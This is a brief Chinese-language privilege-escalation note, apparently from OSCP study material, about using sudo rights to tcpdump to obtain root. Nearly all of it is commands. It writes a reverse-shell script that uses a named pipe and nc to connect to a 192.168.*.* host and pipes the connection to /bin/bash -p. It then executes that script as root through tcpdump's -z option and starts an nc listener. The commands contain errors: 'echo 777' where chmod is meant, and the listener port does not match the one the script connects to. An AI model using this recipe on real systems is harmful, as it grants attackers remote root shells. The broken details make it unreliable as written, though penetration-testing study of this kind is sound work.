# tcpdump

`tcpdump` 若具有 `sudo` 权限,可通过调用反单脚本，用nc获取root权限

```
echo "mknod backpipe p && nc 192.168.*.* 8089 0<backpipe | /bin/bash -p 1>backpipe" >/tmp/.test
echo 777 /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root


nc -lvpn 8888
```
![tcpdump](https://github.com/Nongcloud/oscp-Learn/tree/main/Privilege-Escalation/sudo/images/sudo-tcpdump.png)